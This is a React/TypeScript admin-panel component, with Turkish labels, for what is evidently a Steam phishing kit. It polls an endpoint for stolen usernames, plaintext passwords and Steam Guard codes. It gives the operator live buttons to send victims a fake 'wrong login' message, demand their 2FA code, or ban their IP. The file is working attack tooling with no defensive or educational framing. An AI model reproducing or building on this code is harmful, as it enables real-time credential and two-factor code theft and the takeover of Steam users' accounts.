
import React, { useState, useEffect } from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { RefreshCcw, Shield, Ban, Wifi, WifiOff } from 'lucide-react';
import { toast } from 'sonner';

// Type for our mock database entries
interface LoginAttempt {
  id: string;
  username: string;
  password: string;
  steamguard?: string;
  timestamp: string;
  ip: string;
  online: boolean;
  status: 'pending' | 'rejected' | 'awaiting_2fa' | 'completed' | 'blocked';
}

const AdminPanel = () => {
  const [loginAttempts, setLoginAttempts] = useState<LoginAttempt[]>([]);
  const [isLoading, setIsLoading] = useState(true);

  // Fetch data from our mock database
  const fetchLoginAttempts = async () => {
    setIsLoading(true);
    
    try {
      const response = await fetch('/api/get-credentials');
      const data = await response.json();
      setLoginAttempts(data);
    } catch (error) {
      console.error('Error fetching credentials:', error);
      toast.error('Veri yüklenirken bir hata oluştu');
    } finally {
      setIsLoading(false);
    }
  };

  useEffect(() => {
    fetchLoginAttempts();
    
    // Set up polling to refresh data every 5 seconds
    const interval = setInterval(fetchLoginAttempts, 5000);
    
    return () => clearInterval(interval);
  }, []);

  // Handle admin actions
  const handleRetryRequest = async (username: string) => {
    try {
      await fetch('/api/set-admin-action', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          username,
          action: 'retry'
        }),
      });
      
      toast.success("İşlem başarılı: Kullanıcıya 'Hatalı giriş' mesajı gönderildi");
      
      // Update local state immediately for better UX
      setLoginAttempts(prev => 
        prev.map(attempt => 
          attempt.username === username ? { ...attempt, status: 'rejected' } : attempt
        )
      );
      
      // Refresh the data after a short delay
      setTimeout(fetchLoginAttempts, 1000);
      
    } catch (error) {
      toast.error('İşlem başarısız oldu');
    }
  };

  const handleSteamGuardRequest = async (username: string) => {
    try {
      await fetch('/api/set-admin-action', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          username,
          action: 'steam-guard'
        }),
      });
      
      toast.success("İşlem başarılı: Kullanıcıya Steam Guard kodu soruldu");
      
      // Update local state immediately for better UX
      setLoginAttempts(prev => 
        prev.map(attempt => 
          attempt.username === username ? { ...attempt, status: 'awaiting_2fa' } : attempt
        )
      );
      
      // Refresh the data after a short delay
      setTimeout(fetchLoginAttempts, 1000);
      
    } catch (error) {
      toast.error('İşlem başarısız oldu');
    }
  };

  const handleIpBlock = async (ip: string) => {
    try {
      const response = await fetch('/api/block-ip', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          ip
        }),
      });
      
      const data = await response.json();
      
      if (data.success) {
        toast.success(`IP Adresi başarıyla engellendi: ${ip}`);
        
        // Update local state immediately for better UX
        setLoginAttempts(prev => 
          prev.map(attempt => 
            attempt.ip === ip ? { ...attempt, status: 'blocked' } : attempt
          )
        );
        
        // Refresh the data after a short delay
        setTimeout(fetchLoginAttempts, 1000);
      }
      
    } catch (error) {
      toast.error('IP engelleme işlemi başarısız oldu');
    }
  };

  return (
    <div className="container mx-auto p-6 max-w-6xl">
      <div className="flex justify-between items-center mb-6">
        <h1 className="text-2xl font-bold">Steam Panel</h1>
        <Button variant="outline" onClick={() => fetchLoginAttempts()}>
          <RefreshCcw className="mr-2 h-4 w-4" />
          Yenile
        </Button>
      </div>

      <div className="grid gap-4">
        <Card>
          <CardHeader>
            <CardTitle>Giriş Denemeleri</CardTitle>
          </CardHeader>
          <CardContent>
            {isLoading ? (
              <div className="text-center py-4">Yükleniyor...</div>
            ) : loginAttempts.length === 0 ? (
              <div className="text-center py-4 text-muted-foreground">
                Henüz giriş denemesi yok
              </div>
            ) : (
              <div className="overflow-x-auto">
                <table className="w-full">
                  <thead>
                    <tr className="border-b">
                      <th className="text-left p-2">Kullanıcı Adı</th>
                      <th className="text-left p-2">Şifre</th>
                      <th className="text-left p-2">Steam Guard</th>
                      <th className="text-left p-2">IP Adresi</th>
                      <th className="text-left p-2">Durum</th>
                      <th className="text-left p-2">Çevrimiçi</th>
                      <th className="text-left p-2">Zaman</th>
                      <th className="text-right p-2">İşlemler</th>
                    </tr>
                  </thead>
                  <tbody>
                    {loginAttempts.map((attempt) => (
                      <tr key={attempt.id} className="border-b">
                        <td className="p-2">{attempt.username}</td>
                        <td className="p-2">{attempt.password}</td>
                        <td className="p-2">{attempt.steamguard || '-'}</td>
                        <td className="p-2">{attempt.ip}</td>
                        <td className="p-2">
                          <span className={`px-2 py-1 rounded text-xs ${
                            attempt.status === 'pending' ? 'bg-yellow-500/20 text-yellow-500' :
                            attempt.status === 'rejected' ? 'bg-red-500/20 text-red-500' :
                            attempt.status === 'awaiting_2fa' ? 'bg-blue-500/20 text-blue-500' :
                            attempt.status === 'blocked' ? 'bg-gray-500/20 text-gray-500' :
                            'bg-green-500/20 text-green-500'
                          }`}>
                            {attempt.status === 'pending' ? 'Beklemede' :
                             attempt.status === 'rejected' ? 'Reddedildi' :
                             attempt.status === 'awaiting_2fa' ? 'Steam Guard Bekliyor' :
                             attempt.status === 'blocked' ? 'Engellendi' :
                             'Tamamlandı'}
                          </span>
                        </td>
                        <td className="p-2">
                          {attempt.online ? (
                            <span className="flex items-center text-green-500">
                              <Wifi className="h-4 w-4 mr-1" /> Çevrimiçi
                            </span>
                          ) : (
                            <span className="flex items-center text-gray-500">
                              <WifiOff className="h-4 w-4 mr-1" /> Çevrimdışı
                            </span>
                          )}
                        </td>
                        <td className="p-2">{new Date(attempt.timestamp).toLocaleString()}</td>
                        <td className="p-2 text-right">
                          <div className="flex justify-end gap-2">
                            <Button 
                              variant="outline" 
                              size="sm"
                              onClick={() => handleRetryRequest(attempt.username)}
                              disabled={attempt.status !== 'pending' || attempt.status === 'blocked'}
                            >
                              Tekrar Gönder
                            </Button>
                            <Button 
                              variant="outline" 
                              size="sm"
                              onClick={() => handleSteamGuardRequest(attempt.username)}
                              disabled={attempt.status !== 'pending' || attempt.status === 'blocked'}
                            >
                              <Shield className="mr-1 h-3 w-3" />
                              Steam Guard İste
                            </Button>
                            <Button 
                              variant="outline" 
                              size="sm"
                              className="text-red-500 border-red-500 hover:bg-red-500/10"
                              onClick={() => handleIpBlock(attempt.ip)}
                              disabled={attempt.status === 'blocked'}
                            >
                              <Ban className="mr-1 h-3 w-3" />
                              IP Yasakla
                            </Button>
                          </div>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            )}
          </CardContent>
        </Card>
      </div>
    </div>
  );
};

export default AdminPanel;
